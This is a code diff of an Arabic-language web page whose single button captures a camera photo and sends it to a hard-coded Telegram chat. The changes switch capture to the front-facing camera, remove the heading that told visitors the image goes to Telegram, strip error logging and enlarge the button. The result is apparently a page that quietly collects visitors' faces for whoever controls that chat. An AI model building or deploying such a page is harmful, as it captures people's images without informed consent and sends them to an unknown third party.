@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,48 +9,33 @@
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            background-color: #f0f0f0;
         }
         #captureBtn {
             background-color: #0088cc;
             color: white;
             border: none;
-            padding: 15px 25px;
-            font-size: 18px;
-            border-radius: 5px;
+            padding: 20px;
+            font-size: 20px;
+            border-radius: 10px;
             cursor: pointer;
-            margin: 20px 0;
+            margin: 50px 0;
+            width: 100%;
+            max-width: 300px;
         }
         #status {
             margin-top: 20px;
-            padding: 10px;
+            padding: 15px;
             border-radius: 5px;
             display: none;
         }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-        }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-        }
+        .success { background-color: #d4edda; color: #155724; }
+        .error { background-color: #f8d7da; color: #721c24; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>إرسال صورة إلى Telegram</h1>
-        <button id="captureBtn">التقاط صورة وإرسالها</button>
-        <div id="status"></div>
-    </div>
+    <button id="captureBtn">التقاط صورة وإرسالها</button>
+    <div id="status"></div>
 
     <script>
         document.getElementById('captureBtn').addEventListener('click', async function() {
@@ -58,36 +43,26 @@
             const chatId = '8096601840';
             
             try {
-                // طلب الإذن للوصول إلى الكاميرا
+                // استخدام الكاميرا الأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' }
+                    video: { facingMode: 'user' } // الكاميرا الأمامية
                 });
                 
-                // إنشاء فيديو خفي للتقاط الصورة
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
                 
-                // انتظار تحميل الفيديو
-                await new Promise(resolve => {
-                    video.onloadedmetadata = resolve;
-                });
+                await new Promise(resolve => video.onloadedmetadata = resolve);
                 
-                // إنشاء canvas لالتقاط الصورة
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // تحويل الصورة إلى Blob
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                 
-                // إيقاف الكاميرا
                 stream.getTracks().forEach(track => track.stop());
                 
-                // إرسال الصورة إلى Telegram
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'photo.jpg');
@@ -106,7 +81,6 @@
                     showStatus('فشل في إرسال الصورة', 'error');
                 }
             } catch (error) {
-                console.error('Error:', error);
                 showStatus('حدث خطأ: ' + error.message, 'error');
             }
         });
